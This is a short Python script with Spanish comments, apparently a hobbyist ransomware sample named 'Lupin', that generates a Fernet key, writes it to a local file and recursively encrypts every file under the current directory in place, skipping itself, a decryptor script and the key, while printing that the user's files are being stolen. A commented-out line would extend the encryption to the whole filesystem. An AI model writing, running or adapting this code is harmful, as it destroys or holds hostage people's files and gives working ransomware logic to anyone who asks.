import os
from cryptography.fernet import Fernet

#Primero buscamos todos los archivos del dorectorio menos el propio Lupin
# Evitar que encripte también la llave con el objetivo de poder desencriptar luego los archivos

print ("Todo sus archivos van a ser robados")

#Generación de la llave con Fernet. Evita que se pueda abrir un archivo al menos que se tenga la llave
llave = Fernet.generate_key()
with open("laLLave.key","wb") as laLLave:
    laLLave.write(llave)

#encriptar archivos
def encriptar_archivo(nombre_archivo,llave):
    with open(nombre_archivo,"rb") as archivo:
        contenido = archivo.read()
    encriptado = Fernet(llave).encrypt(contenido)
    with open(nombre_archivo,"wb") as archivo_encrypt:
        archivo_encrypt.write(encriptado)

#encripatr directorio
def encriptar_directorio(ruta_directorio,llave):
    for raiz, directorios, archivos in os.walk(ruta_directorio): # trabaja de forma recusiva
        for nombre_archivo in archivos:
            if nombre_archivo in ["Lupin.py","ganimard.py","laLLave.key"]:
                continue
            else:
                ruta_completa = os.path.join(raiz,nombre_archivo)
                encriptar_archivo(ruta_completa,llave)

#directorio actual y lo que hay debajo
encriptar_directorio('.',llave)
#Enciptar Todo
#encriptar_directorio('../../../../../../../../../../../../',llave)
    
        
print ("Todo sus archivos han sido robados")